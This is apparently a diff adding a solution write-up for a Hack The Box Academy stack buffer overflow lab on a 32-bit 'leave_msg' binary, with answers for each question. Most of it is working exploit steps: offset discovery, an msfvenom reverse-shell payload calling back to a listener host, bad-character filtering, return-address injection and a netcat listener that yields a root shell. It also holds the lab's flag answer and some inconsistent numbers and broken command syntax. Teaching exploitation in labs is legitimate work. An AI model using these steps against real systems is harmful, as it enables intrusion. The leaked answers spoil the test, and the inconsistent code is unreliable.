@@ -1720,18 +1720,260 @@ Q1: Determine the file type of "leave_msg" binary and submit it as the answer.
 
 **Hint: Knowing for which CPU architecture the binary has been compiled also belongs to the file type.**
 
-A:
+A: ELF 32-bit
+
+**Solution**
+```
+Note: Connect to Academy Vpn and ssh First
+```
+In `htb-student` home directory there is a binary name `leave_msg` that we have to test.Use `file` command on it and there you can see the type of the binary and its architecture information
+```
+$ file leave_msg |tr "," "\n"
+```
 
 
 Q2: How many bytes in total must be sent before reaching EIP?
 
-A:
+A: 2060
+
+**Solution**
+
+Open The binary in `gdb` using the following command
+```shell
+$ gdb -q leave_msg
+```
+After that use the following command to change its syntax into `intel` processor format it is not mandatory
+```shell
+(gdb) set disassembly-flavor intel
+```
+Now use the command `disassemble main` and `disassemble leavemsg`.This will show you assembly language of program in memory.So after that we see there is a function name `leavemsg` that get our input and we have to abuse that function.To do that first we have to submit too many bytes to it so we can check where they show us error message `segmentation fault` to do that we use python in `gdb`
+```gdb
+(gdb)run $(python -c 'print "\x55"*1000')
+```
+There we use `\x55` that are `U` in hex up to `1000` bytes they will like this in memory
+```
+0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55 ....<snip>
+```
+They will execute smoothly that means they will not disturbed our program but when we  increase our bytes up to 2550 or more they show us an error message called `segmentation fault` so now we know how much bytes we need to do a segmentation fault error that our first step.
+**Step 1>Identify where segmentation fault occurs**
+Now we know where segmentation fault occur now we have to know the exact bytes number to  where segmentation fault occur so to find out that we use `metasploit`script name `pattern_create.rb` that create a pattern for using our required no bytes like we know `2550` bytes will cause an segmentation fault error so we create a pattern in `2550` bytes using the following command script 
+```shell
+$  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2550 > pattern.txt
+```
+Now we create a pattern so copy the pattern and paste it in python command like the following
+```gdb
+(gdb) run $(python -c 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab...<snip>')
+```
+When we run that we see the segmentation fault error like before but we see some value/address also that cause the error we can see it using the following command
+```gdb
+(gdb) info register eip
+```
+copy the `EIP` value and we use that value to find what are the exact no bytes that cause the segmentation fault.Paste the address value after the `-q` in Metasploit script `pattern_offset` like follows  
+```shell
+$  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
+```
+They show us the exact number of bytes where segmentation fault occurs.
+That is step two in BOF
+**Step 2>Finding the offset where segmentation fault occur using pattern_create and pattern_offset metasploit script or any other source**
+The exact no of bytes where segmentation fault occur is our answer in this task.
 
 Q3: Submit the size of the stack space after overwriting the EIP as the answer. (Format: 0x00000)
 
-A:
+A: 0x22000
+
+**Solution**
+
+In the previous question we find the exact no bytes where our program show segmentation fault error using metasploit script `pattern_create.rb` and `pattern_offset` so now our buffer overflow notes is
+```BOF Notes
+Buffer = 2060 bytes
+```
+After 2060 bytes we discovered the `eip` value and now we can easily overwrite the `eip` and we can control the `eip` But for safety we use 8 bytes after the buffer.So our notes now   
+```BOF Notes
+Buffer = 2060 bytes
+eip = 8 bytes
+```
+So now we can control the `eip` now let find out our shellcode length to do that we have to make a testing shellcode we can do that using the following command.
+```
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 --platform linux --arch x86 --format c
+```
+Here we use `msfvenom` that are metasploit module that are use to generate different payloads.
+Here,
+- **`-p`:** Is use for specify payload type
+- **`LHOST`:** Is use to specify Local Host Address where we receives the connection
+- **`LPORT`**: Is use to specify Local Host Port where they connect
+- **`--platform`**: Is use to specify the platform(operating system)
+- **`--arch`**: Is use to specify target architecture
+- **`--format`**: Is use to specify the format like `c`.As we are testing `c` program so we use format `c`
+Its Output is like following 
+```shell-session
+W4H33D@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
+
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+<SNIP>
+```
+There we see our temporary payload size is 68 bytes and we add some NOP's before the payload so they will execute smoothly.So now our BOF Notes are following
+```BOF Notes
+Buffer = 2060
+eip = 8 bytes
+shellcode = 68 bytes
+NOP's = 100
+```
+So Now we have every thing we need to exploit buffer overflow but we strictly follow the  following instructing to exploit it correctly
+```
+[Buffer]+[NOP's]+[ShellCode]+[Eip] 
+```
+1. We have total 2060 bytes and we have to manage write our Buffer,NOP's and shellcode in it
+2. After that we have find which address NOP's start and where it end's and shellcode begins
+3. We can use any address between NOP's and ShellCode
+4. In Last we use that address bytes to overwrite the `eip` value
+
+So let's start with Buffer,NOP's and shellcode.
+```
+Buffer = Totel Buffer - NOP's - ShellCode - EIP
+
+Example:
+
+Buffer = 2060 - 100 - 68 - 8
+```
+So we use that information in `gdb` with the following command syntax
+```gdb
+(gdb) run $(python -c "print '\x55'*(2060-100-68 - 8)+'\x90'*100+'shellcode'+'eip'*8*")
+```
+This is all we need here
+- `\x55` is our buffer 
+- `\x90` is NOP's
+- `shellcode` This contains our shell code
+- `eip` This contains any address between NOP's and shellcode
+
+By Putting all the values they are like following
+
+```gdb
+(gdb) run $(python -c "print '\x55'*(2060-100-68-8)+'\x90'*73+'\xbd\xb4\xeb\x88..<snip>..\x47\x84\x13\x5d\xd5\x05\xad'+'\x66'*8")
+```
+If the program show segmentation fault error with the address like `0x66666666` then we are on right track.So now we have to find Bad characters so we can exclude bad characters from our payload.Bad Characters are following  
+```
+"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+```
+This is the total bad characters now we use bad character in our shellcode place like the following command syntax
+```gdb
+(gdb) run $(python -c "'\x55'*(2060-100-68-8)+'\x00\x01\x02\x03\x04\x05\x06\x07\..<snip>..\xfb\xfc\xfd\xfe\xff'+'\x66'*8*")
+```
+After that we use the following command in `gdb`
+```gdb
+(gdb) x/2000xb $esp+500
+```
+This will show you all the data in memory there you have to find where our bad characters start and then find which character will not include there like the following steps
+```
+<snip...>
+
+0xffffd2b0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00  
+0xffffd2c8:     0x64    0x65    0x6e    0x74    0x2f    0x62    0x6f    0x77  # --> From here our suplied buffer values starts   
+0xffffd2d8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55 
+<snip...>  
+0xffffd5d8:     0x55    0x55    0x55         # ---> From Here our Bad Characters starts       0x01    0x02    0x03  
+0xffffd5e0:     0x04    0x05    0x06    0x07    0x08 # ---> From here we expect "0x09"   0x00    0x0b    0x0c  
+---Type <return> to continue, or q <return> to quit---  
+0xffffd5e8:     0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14  
+0xffffd5f0:     0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c  
+0xffffd5f8:     0x1d    0x1e    0x1f    0x00    0x21    0x22    0x23    0x24  
+...<snip>... 
+0xffffd628:     0x4d    0x4e    0x4f    0x50    0x51    0x52    0x53    0x54
+```
+There we see after a series of `0x55`(Our buffer value (`\x55`) that we passed to the program) our bad characters starts and we see they are start with `0x01` but in our bad character list is start with `\x00` that are equal to `0x00` so that mean `\x00` is a bad character so we have to remove it from our payload after that we also see after the `0x08` there is `0x00` value that we know is a bad character and also we expect to have a value of `0x09` because if we see in our bad characters list after `\x08` the next value is `\x09` that are equal to `0x09`.So that means `0x09` is also a bad character and we have to remove it also so we follow the same procedure again and again to find all bad character and any time we find any bad character we have to remove it also in our python command like follows
+```
+(gdb) run $(python -c "'\x55'*(2060-100-68-8)+'\x01\x02\x03\x04\x05\x06\x07\0x8\0xb..<snip>..\xfb\xfc\xfd\xfe\xff'+'\x66'*8*")
+```
+There you can see we start our bad character with `\x01` not with `\x00` because we know they are a bad character like so we have to remove `\x09` also and any other bad character you find just see which character is missing and confirm him with our list if they are on our list but not in memory so that means they are a bad character.This is just an example how you find the bad character you will find different one but when you find our they are following.
+```
+\x00\x09\x0a\x20
+```
+So they are all the bad character we find so now we know which bad character we exclude from our payload so we use the following `msfvenom` command syntax to make a payload that are not include bad characters in it.
+Command Syntax:
+```msf
+$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
+```
+After giving all the values they will like follows
+```
+$ msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.10.1 lport=4444 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out ShellCode
+```
+So they give us the shell code but use your `lhost` and `lport` respectively and now you will see payload size will increases to `95` bytes or more so now you have to calculate all the values again.
+```BOF Notes
+Buffer = 2060
+
+NOP's = 100
+
+ShellCode = 98
+
+EIP = 8 bytes
+```
+**Here is the Tip how to calculate buffer value**:
+
+To calculate you just have adjust all the the values in the total buffer value(`2060`)
+Like the following
+Python Syntax:
+```gdb
+(gdb) run $(python -c "print '\x55'*(2060-181-95-8)+'\x90'*189+'ShellCode here'+'\x66'*8")
+```
+There you will see `(2060-181-95-8)` that are equal to `1776` so how many bytes left `2060-1776` is equal to `284` so in which `98` bytes is for our shellcode and all the other bytes is for our NOP's.
+
+So now we calculate the exploit the only thing is left is our return address so to find that run the above command but paste the shellcode in it and after that use the following command again.
+```gdb
+(gdb) x/2000xb $esp+500
+```
+There you will all the memory address but you have to copy any address between the NOP's like follows
+```
+0xffffd604:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd60c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd614:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd61c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd624:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd62c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+```
+So there we suppose we use `0xffffd60c` so we put that address in our `eip` place in python command but first we have to change that address in `intel` processor format.In inter processor we have to use that address in backward like follows:
+```
+\x0c\xd6\xff\xff
+```
+So now our python command are following
+```gdb
+(gdb) run $(python -c "print '\x55'*(2060-181-95-8)+'\x90'*189+'ShellCode here'+'\x0c\xd6\xff\xff'*8")
+```
+**Note paste you shell code in the command**
+Now run that command and you will see and exception is show that say they open other binary name `\bin\dash` or something like this so that means our BOF will execute properly and to find the answer of this question now you will use the following command
+```(gdb)
+(gdb) info proc mappings
+```
+There in last you will see the stack value.If you will not able to see the output then use `break leavemsg` command and then again use the python command and after that use `info proc mappings` command and you will find the answer of this question
 
 Q4: Read the file "/root/flag.txt" and submit the content as the answer.
 
-A:
+A: HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}
 
+**Solution**
+
+In Previous task we successfully able to do a buffer overflow and now we know what is the exact values we have to submit to do a buffer overflow so now open a netcat listener in you system using the following command 
+```bash
+$ nc -lvnp 4444
+```
+If you use other port instead of `4444` then use that port number.After that submit the python command you will use to do buffer overflow in `gdb` like follows
+```bash
+htb-student:~$ ./leave_msg $(python -c "print '\x55'*(2060-181-95-8)+'\x90'*189+'ShellCode here'+'\x0c\xd6\xff\xff'*8")
+```
+**Note: Submit your shellcode in the command above**
+If every thing gone right you will got a reverse shell back to you netcat listener and they have a root access so you can use command `cat /root/flag.txt` to read the flag.
+
+-----
+
+# Summary Of Buffer Overflow
+
+1. Find the how many byte we need to do a segmentation fault error
+2. Find the exact no bytes/offset where segmentation fault occurs
+3. Take Control to the EIP
+4. Determine Bad Characters
+5. Determine the ShellCode Length.
+6. Add Some NOP's before the ShellCode
+7. Find any one memory address between NOP's and ShellCode.
+8. Change that address into system architecture format like `intel` format is backward
+9. Combine all of the above to exploit the vulnerability
+
+-----
